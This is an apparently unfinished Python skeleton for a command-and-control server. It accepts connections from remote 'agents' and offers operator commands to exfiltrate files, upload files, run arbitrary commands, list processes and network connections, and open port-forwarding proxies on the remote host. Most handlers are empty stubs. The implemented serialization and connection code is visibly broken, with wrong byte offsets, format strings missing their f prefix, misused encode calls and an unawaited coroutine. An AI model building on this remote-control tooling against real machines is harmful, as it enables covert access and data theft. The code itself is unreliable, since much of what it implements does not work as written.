#!/usr/bin/env python3

import asyncio
import random
import signal
import struct
from typing import Optional

import aioconsole
import pprint

import socket
import scapy.all as scapy
import struct

'''
virtualenv -p python3 venv
	

source venv/bin/activate
deactivate

 pip3 install -r requirements.txt

'''

def print_std_help():
    help_items = {
        "help": "This help screen",
        "agents": "List agents",
        "use [agent_name]": "Use the selected agent for agent specfic commands",
        "unuse": "Stop using the selected agent",
    }
    out_text = ""
    maxlen = 0
    for key in help_items.keys():
        if maxlen < len(key):
            maxlen = len(key)
    for key in help_items.keys():
        out_text += f"{key:<{maxlen}} : {help_items[key]}\n"
    print(out_text)

def print_agent_help():
    agent_items = {
        "responses": "List responses returned from this agent.",
        "rename [new_name]": "Change the current agent's name.",
        "shutdown": "Tell the agent to exit.",
        "sleep [sec]": "Cause the agent to sleep for [sec] second(s) then callback.",
        "upload [src] [dst]": (
            "Load a file form [src] on the local host and copy"
            " it to [dst] on the remote host."
        ),
        "download [path]": (
            "Tell the agent to read a file from [path] on the remote"
            " host and exfil it to the local host.  The data will be stored in"
            " responses and can be written to disk with 'export'."
        ),
        "hostname": "Get the hostname of the remote host.",
        "netstat": (
            "Tell the agent to query the current network connections"
            " (listening and connected) on the remote host."
        ),
        "proclist [pid]": (
            "Tell the agent to list the running processess on the remote"
            " machine.  Can optionally be provided a pid to list details about"
            " that particular process."
        ),
        "invoke [cmd*]": (
            "Tell the agent to run the command [cmd].  Returns"
            " STDOUT of th subprocess in reposnes."
        ),
        "proxy [localport] [targethost] [targetport]": (
            "Create a portforwarding proxy"
            " on the remote host.  a port [localport] will be opened on the remote"
            " host that when connected to will forward connections to"
            " [targethost]:[targetport]"
        ),
        "export [index] [path]": (
            "Save the response at index [index] to the local path [path]."
        ),
    }
    out_text = ""
    maxlen = 0
    for key in agent_items.keys():
        if maxlen < len(key):
            maxlen = len(key)
    for key in agent_items.keys():
        out_text += f"{key:<{maxlen}} : {agent_items[key]}\n"
    print(out_text)

class Agent:
    """Create an Agent object whenever an agent connectes to track outbound tasks and
    inbound responses. The tasks are stored in an asyncio.Queue which can be awaited
    on.  In you networking code, await on the Queue to know when new commands are added.
    responses is just a regular list because we dont need to be notified asnycronously
    when they arrive. The Queue will store tuples with (command, args), the responses
    will store tuples with (ret_code, message)
    

    commands: asyncio.Queue[tuple[bytes, bytes]]
    responses: list[tuple[int, bytes]]
    name: str
    """
    def __init__(self):
        self.commands: asyncio.Queue[tuple[bytes, bytes]] = asyncio.Queue(20)
        self.responses: list[tuple[int, bytes]] = []
        self.name = "agent_" + str(random.randint(100, 999))

    def __str__(self) -> str:
        return self.name

    def print_responses(self):
        print(f"{self} Responses")
        print(f"{'ndx':>4}|{'size':>7}|{'ret':>4}|{'data':>5}")
        for (i, (ret_code, data)) in enumerate(self.responses):
            print(f"{i:>4}|{len(data):>7}|{ret_code:>4}|{data.__repr__():<.50}")


def get_agent_by_name(name: str, agents_connected: list[Agent]) -> Agent | None:
    """Search the agents_connected list for an agent with name: [name]. This can be a
    useful helper function throughout the code base.

    Args:
        name (str): The name of the agent.
        agents_connected (list[Agent]): the list that contains all the agents.

    Returns:
        Agent | None: The agent with the queried name or None if not found.
    """

    pass


def export_response(response: bytes, filename: str) -> None:
    """Writes the response to the local file system.  You can do as much or as little
    error checking as you wish.

    Args:
        response (bytes): They bytes of the response from the agent.
        filename (str): The local path which will be written to.
    """

    pass


async def parse_response(reader: asyncio.StreamReader) -> tuple[int, bytes]:
    """Converts the byte stream from the agent to something more useful programatically.
    The default agent returns responses generically as:

    struct response {
        uint32_t total_message_size;
        uint32_t ret_code;
        uint32_t msg_length;
        char message[msg_length]
    }

    What we care about is the message as bytes (dont eagarly convert to a str because
    a response may not be UTF-8), and the return code.

    Args:
        reader (asyncio.StreamReader): The asyncronous stream from which to read a
                                       single response from.

    Returns:
        tuple[int, bytes]: return a tuple with the return code and the message.
    """
    #Format the data from the reader pipeline according to the data sizes of the response struct
    print("Starting to parse response")

    while not reader.at_eof():

        #Read in the total message size
        total_message_size = await reader.read(4)
        print(f"Total message size has been read in")

        d_total_message_size = struct.unpack('>I', total_message_size)
        print(f"Total msg size: {d_total_message_size}")

        #Read in the ret_code
        ret_code = await reader.read(4)
        print("Ret code has been read in")

        #Deserialize ret code
        d_ret_code = struct.unpack('>I', ret_code)
        print(f"Ret code: {d_ret_code}")

        #Read in the msg_length
        msg_length = await reader.read(4)
        print("Msg length has been read in")

        #Deserialize msg_length
        d_msg_length = struct.unpack('>I', msg_length)
        print(f"Msg length: {d_msg_length}")

        #Read in the msg
        msg = await reader.read(d_msg_length[0])
        print("Msg has been read in")

        #Deserialize msg
        d_msg = struct.unpack(f'>{d_msg_length[0]}s', msg)
        print(f"Msg: {d_msg[0]}")

        #Load the ret_code and message into the respective tuple fields
        tuple = (d_ret_code[0], d_msg[0])

        #Force end of file response to exit while loop
        reader.feed_eof()

    print("Response has been parsed, returning tuple")
    print(f"Ret code: {tuple[0]}, msg: {tuple[1]}")
    return tuple


def create_command(command: bytes, args: bytes) -> bytes:
    """creates a packed stream of bytes that is ready to be sent to the agent.  Use
    this function as a utility to serialize commands.  A command needs to be sent in the
    following format

    struct command {
        uint32_t total_message_size;
        uint32_t command_length;
        char command[command_length];   //NULL TERMINATED
        uint32_t args_length;
        char args[args_length];
    }

    Args:
        command (bytes): the command to be sent
        args (bytes): arguments for the command (these can be wildly differnt, try to
                      split up the functionallity for generating these)

    Returns:
        bytes: a serialized bytestream that can be sent to the agent
    """
    command_bytearray = bytearray(b'')

    command_length = len(command)

    #TODO You may get multiple arguments separated by a ' '. Need to join them together for serialization
    args_length = len(args)
    total_message_size = command_length + (len(command) + 1) + args_length + len(args)
    
    # import struct, how to pack a byte stream for serialization/deserial. Load into bytearray as element is serialized

    struct.pack_into('I', command_bytearray, 0, total_message_size)
    struct.pack_into('I', command_bytearray, 1, command_length)
    struct.pack_into('{command_length}s', command_bytearray, 2, command.encode())
    struct.pack_into('I', command_bytearray, 3, args_length)
    struct.pack_into('{args_length}s', command_bytearray, 4, args.encode())

    return command_bytearray


def create_upload_arg(src: str, dst: str) -> bytes:
    """The agruments for the upload command are a bit more complicated that the other
    commands. Use this function to generate serialized arguments for the upload command.
    This function may involve reading from files, so add as much or as little error
    checking as you see fit.

    struct upload_args{
        uint32_t file_path_size;
        char file_path[file_path_size];       // NULL TERMINATED
        uint32_t contents_size;
        char contents[contents_size];
    }

    Args:
        src (str): path on the local host
        dst (str): path on the remote host

    Returns:
        bytes: serialzed args for a upload command
    """

    pass


def create_proxy_arg(local_port: str, remote_host: str, remote_port: str) -> bytes:
    """The proxy args are also complicated like the upload args. Please note that the
    arguments that are passed in this function are not in the same order that they are
    sent on the wire.  You may choose to rearrange their order if you wish.

    struct proxy_args {
        uint32_t target_host_len
        char target_host[target_host_len];   //NULL TERMINATED
        uint32_t target_port_len;
        char target_port[target_port_len];
        uint16_t local_port                  // IMPORTANT: localport is a uint16_t while
    }                                        // target port is a NULL TERMINATED string


    Args:
        local_port (str): port to open on the remote host
        remote_host (str): host the proxy will forward to
        remote_port (str): port the poxy will forward to

    Returns:
        bytes: serialized args for the proxy command
    """

    pass


async def manage_agent(
    agent: Agent, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
):
    """Handler for new agents after they connect.  Use this function as a 'main loop'
    for an individual connection to send and recive data.  Use the queue on the agent
    object to know when the user wants to send commands then await on the reader to get
    responses.  You can conveniently assume that one request will have one response so
    you can alternate between sending and recieving. The loop should be
    (in pseudo code):

    while connected:
        "wait for command from user"
        "send command to agent"
        "recieve response from agent"

    manage_Agent calls create_command, get_agent_name

    Args:
        agent (Agent): the agent object tied to this connection
        reader (asyncio.StreamReader): stream to get data from the agent
        writer (asyncio.StreamWriter): stream to send data to the agent
    """

    #Read from command queue, write to agent
    data = await reader.read(100)
    message = data.decode('utf-8')

    #Split message into expected arguments (cmd & args), delimited by a " "
    #Example "sleep 15" or "proxy 1337 192.555.23.33 4444"
    split_message = message.split(' ')
    cmd = split_message[0]
    args = split_message[1:]

    agent.commands = create_command(cmd, args)

    #"Send" the command by putting it into the writer stream
    print(f"Sending command: {agent.commands}")
    writer.write(agent.commands)
    await writer.drain()

    #Read response from agent, append to response queue (2-3 lines)
    agent_data = await reader.read(1024)
    agent_response = agent_data.decode('utf-8')
    agent.responses.append(agent_response)

    pass


def client_conn_cb(agents_connected: list[Agent]):
    async def client_conn(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """This callback will get called each time a new TCP connection is made on the
        server.  use this to setup everything for an agent and start the manage_agent
        loop.  this callback closes over the agents connected param in the parent
        because it cant be passed directly as a param bacause it has to match the
        callback protocol. Use the agents_connected list to add newly connected agents.

        Load response property into new agent, handing that off to agent_manage

        Args:
            reader (asyncio.StreamReader): stream to get data from the agent
            writer (asyncio.StreamWriter): stream to send data to the agent
        """

        #Create new agent
        agent = Agent()
        print(f"Creating new agent called {agent}")

        #Add new agent to list
        agents_connected.append(agent)

        #Parse data from reader & append it to the response field of the new agent. Expecting the checkin response
        responses = await parse_response(reader)
        agent.responses.append(responses)
        print(agent.responses)

        #Call manage_agent to do operations
        manage_agent(agents_connected[0], reader, writer)

        print("Client Connected")
        #=========================== END OF ASYNC ======================================
    return client_conn


async def server(agents_connected: list[Agent]):
    """Start a async tcp server.  This can be as simple or complex as you would like.
    The provided code is the most basic setup, but you could make it more configureabe.
    as a streach you could add ssl here.

    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    server = await asyncio.start_server(client_conn_cb(agents_connected), "localhost", 1337)
    print("Server is listening for connections")
    await server.serve_forever()

async def shell(agents_connected: list[Agent]):
    """Start async shell. In this function, utilize the aioconsole 3rd party library to
    asyncronously wait for input (you may decide to implement this another way without
    aioconsole). this will allow us to wait for user input without blocking the rest of
    the program, including the tcp server code.  This function can be implemented with
    the following pseudo code:

    while True:
        "wait for input"
        "parse the input"
        if "input is command"
            "put command in the right agents queue" (invoke, hostname, shutdown, etc.)
        else
            "perform functions not related to agents" (export, list agents, etc.)

    Args:
        agents_connected (list[Agent]): The list containing all connected agents
    """

    selected_agent: Optional[Agent] = None
    while True:
        if selected_agent is None:
            input_prompt = ">> "
        else:
            input_prompt = f"({selected_agent.name})>> "
        command_str: str = await aioconsole.ainput(input_prompt)
        command = command_str.split()
        no_std = False
        no_agt = False

        match command:
            case ["help"]:
                print_std_help()
            case ["agents"]:
                for agents in agents_connected:
                    print(agents)
                pass
            case ["use", agent_name]:
                selected_agent = agent_name
            case ["unuse"]:
                #selected_agent = None
                pass
            case _:
                no_std = True
        if selected_agent is not None:
            match command:
                case ["responses"]:
                    print(selected_agent.responses)
                    pass
                case ["rename", new_name]:
                    pass
                case ["shutdown"]:
                    selected_agent.commands = create_command("shutdown")
                    pass
                case ["sleep", sleeptime]:
                    selected_agent.commands = create_command("sleep", sleeptime)
                    pass
                case ["upload", src, dst]:
                    pass
                case ["download", path]:
                    pass
                case ["hostname"]:
                    pass
                case ["netstat"]:
                    pass
                case ["proclist"]:
                    pass
                case ["proclist", pid]:
                    pass
                case ["invoke", *invoke_cmd]:
                    pass
                case ["proxy", localport, targethost, targetport]:
                    pass
                case ["export", ndx, filename]:
                    pass
                case ["help"]:
                    print_agent_help()
                case _:
                    no_agt = True
        else:
            no_agt = True
        if no_agt and no_std and len(command) != 0:
            print("Invalid command")


async def main():
    """Initializes the agents list and starts the server and shell coroutine"""

    agents_connected: list[Agent] = []
    await asyncio.gather(shell(agents_connected), server(agents_connected))


def sigint_handle(_signum, _frame):
    """Exit the program if the user presses Ctrl+C"""

    print("\nClosing...")
    exit(0)


if __name__ == "__main__":
    """Register signal handler and start main with default event loop"""

    signal.signal(signal.SIGINT, sigint_handle)
    asyncio.run(main())
